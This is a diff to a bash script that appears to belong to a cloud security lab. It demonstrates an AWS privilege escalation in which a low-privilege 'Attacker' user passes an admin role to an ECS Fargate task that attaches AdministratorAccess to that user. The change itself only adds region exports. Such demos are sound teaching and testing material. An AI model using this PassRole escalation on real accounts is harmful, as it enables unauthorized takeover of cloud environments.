@@ -118,6 +118,7 @@ setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 echo "Using region: $AWS_REGION"
 
@@ -135,6 +136,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
@@ -144,6 +146,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -157,6 +160,7 @@ echo ""
 echo -e "${YELLOW}Step 5: Creating ECS cluster${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Cluster name: $CLUSTER_NAME"
 
 show_attack_cmd "Attacker" "aws ecs create-cluster --region $AWS_REGION --cluster-name $CLUSTER_NAME --output json"
@@ -171,6 +175,7 @@ echo -e "${GREEN}✓ Successfully created ECS cluster${NC}\n"
 echo -e "${YELLOW}Step 6: Getting network configuration for Fargate${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 # Get default VPC
 show_cmd "ReadOnly" "aws ec2 describe-vpcs --region $AWS_REGION --filters 'Name=is-default,Values=true' --query 'Vpcs[0].VpcId' --output text"
@@ -206,6 +211,7 @@ echo -e "${GREEN}✓ Retrieved network configuration${NC}\n"
 echo -e "${YELLOW}Step 7: Registering task definition with admin role${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 TARGET_ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE_NAME"
 echo "Target role ARN: $TARGET_ROLE_ARN"
 echo "This task will attach AdministratorAccess to the starting user"
@@ -260,6 +266,7 @@ echo -e "${GREEN}✓ Successfully registered task definition (PassRole executed)
 echo -e "${YELLOW}Step 8: Creating ECS service on Fargate${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Service name: $SERVICE_NAME"
 
 # Create service configuration
@@ -292,6 +299,7 @@ echo -e "${GREEN}✓ Successfully created ECS service${NC}\n"
 echo -e "${YELLOW}Step 9: Waiting for service to become active and launch task${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "This may take 60-90 seconds..."
 
 MAX_WAIT=180
@@ -332,6 +340,7 @@ echo ""
 echo -e "${YELLOW}Step 10: Waiting for task to complete its work${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Monitoring task status..."
 
 MAX_TASK_WAIT=120
@@ -385,6 +394,7 @@ echo -e "${GREEN}✓ Policy propagated${NC}\n"
 echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Attempting to list IAM users..."
 
 show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
